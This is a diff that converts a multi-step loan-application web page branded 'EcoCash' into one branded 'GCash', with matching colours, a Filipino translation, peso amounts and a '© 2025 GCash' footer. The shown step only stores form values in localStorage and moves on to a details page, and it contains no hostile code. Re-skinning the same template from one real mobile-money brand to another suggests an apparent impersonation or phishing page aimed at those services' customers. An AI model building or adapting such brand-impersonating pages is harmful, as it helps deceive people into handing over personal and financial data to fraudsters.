@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fil">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Loan Application</title>
+    <title>GCash - Aplikasyon sa Loan</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -17,7 +17,7 @@
         body {
             height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f5f5f5;
+            background: #f0f2f5;
             overflow: hidden;
         }
         
@@ -38,6 +38,7 @@
             margin-bottom: 10px;
             background: white;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
         }
         
         .back-btn {
@@ -53,12 +54,12 @@
             font-weight: 700;
         }
         
-        .logo-eco {
-            color: #0066ff;
+        .logo-g {
+            color: #007dfe;
         }
         
         .logo-cash {
-            color: #ff0000;
+            color: #007dfe;
         }
         
         .card {
@@ -78,6 +79,7 @@
             font-weight: 700;
             text-align: center;
             margin-bottom: 20px;
+            color: #333;
         }
         
         .progress-bar {
@@ -92,7 +94,7 @@
         .progress-fill {
             width: 33.33%;
             height: 100%;
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #007dfe, #0056b3);
         }
         
         .step-text {
@@ -125,7 +127,7 @@
         .form-select:focus,
         .form-input:focus,
         .form-textarea:focus {
-            border-color: #4361ee;
+            border-color: #007dfe;
             outline: none;
         }
         
@@ -136,7 +138,7 @@
         .next-btn {
             width: 100%;
             padding: 18px;
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #007dfe, #0056b3);
             color: white;
             border: none;
             border-radius: 50px;
@@ -159,17 +161,17 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div class="logo"><span class="logo-g">G</span><span class="logo-cash">Cash</span></div>
         <div></div>
     </header>
     <main class="card">
-        <h1 class="form-title">Loan Application</h1>
+        <h1 class="form-title">Aplikasyon sa Loan</h1>
         <div class="progress-bar">
             <div class="progress-fill"></div>
         </div>
-        <div class="step-text">Step 1 of 3</div>
+        <div class="step-text">Hakbang 1 sa 3</div>
 
-        <label class="form-label">Loan Type</label>
+        <label class="form-label">Uri ng Loan</label>
         <select class="form-select" id="loanType">
             <option>Personal Loan</option>
             <option>Business Loan</option>
@@ -178,31 +180,34 @@
             <option>Education Loan</option>
         </select>
 
-        <label class="form-label">Loan Amount ($)</label>
+        <label class="form-label">Halaga ng Loan (₱)</label>
         <input type="number" class="form-input" id="loanAmount" placeholder="5000" min="100" max="5000">
 
-        <label class="form-label">Loan Term</label>
+        <label class="form-label">Termino ng Loan</label>
         <select class="form-select" id="loanTerm">
-            <option>6 Months</option>
-            <option>12 Months</option>
-            <option>18 Months</option>
-            <option>24 Months</option>
-            <option>36 Months</option>
-            <option>48 Months</option>
-            <option>60 Months</option>
+            <option>6 Buwan</option>
+            <option>12 Buwan</option>
+            <option>18 Buwan</option>
+            <option>24 Buwan</option>
+            <option>36 Buwan</option>
+            <option>48 Buwan</option>
+            <option>60 Buwan</option>
         </select>
 
-        <label class="form-label">Purpose of Loan</label>
-        <textarea class="form-textarea" id="loanPurpose" placeholder="What will you use the loan for?"></textarea>
+        <label class="form-label">Layunin ng Loan</label>
+        <textarea class="form-textarea" id="loanPurpose" placeholder="Para saan mo gagamitin ang loan?"></textarea>
 
-        <button class="next-btn" id="nextBtn">NEXT STEP</button>
+        <button class="next-btn" id="nextBtn">SUNOD NA HAKBANG</button>
     </main>
-    <footer>© 2025 EcoCash</footer>
+    <footer>© 2025 GCash</footer>
 
     <script>
         // Pre-fill
         if (localStorage.getItem('loanAmount')) document.getElementById('loanAmount').value = localStorage.getItem('loanAmount');
-        if (localStorage.getItem('loanTerm')) document.getElementById('loanTerm').value = localStorage.getItem('loanTerm') + ' Months';
+        if (localStorage.getItem('loanTerm')) {
+            const savedTerm = localStorage.getItem('loanTerm');
+            document.getElementById('loanTerm').value = savedTerm + ' Buwan';
+        }
 
         document.getElementById('nextBtn').addEventListener('click', function() {
             const amount = document.getElementById('loanAmount').value.trim();
@@ -221,14 +226,14 @@
             }
 
             if (!valid) {
-                alert('Please fill in all required fields.');
+                alert('Mangyaring punan ang lahat ng kinakailangang patlang.');
                 return;
             }
 
             localStorage.setItem('loanType', document.getElementById('loanType').value);
             localStorage.setItem('loanAmount', amount);
-            localStorage.setItem('loanTerm', document.getElementById('loanTerm').value.replace(' Months', ''));
-            localStorage.setItem('loanPurpose', purpose || 'Not specified');
+            localStorage.setItem('loanTerm', document.getElementById('loanTerm').value.replace(' Buwan', ''));
+            localStorage.setItem('loanPurpose', purpose || 'Hindi tinukoy');
 
             window.location.href = 'details.html';
         });
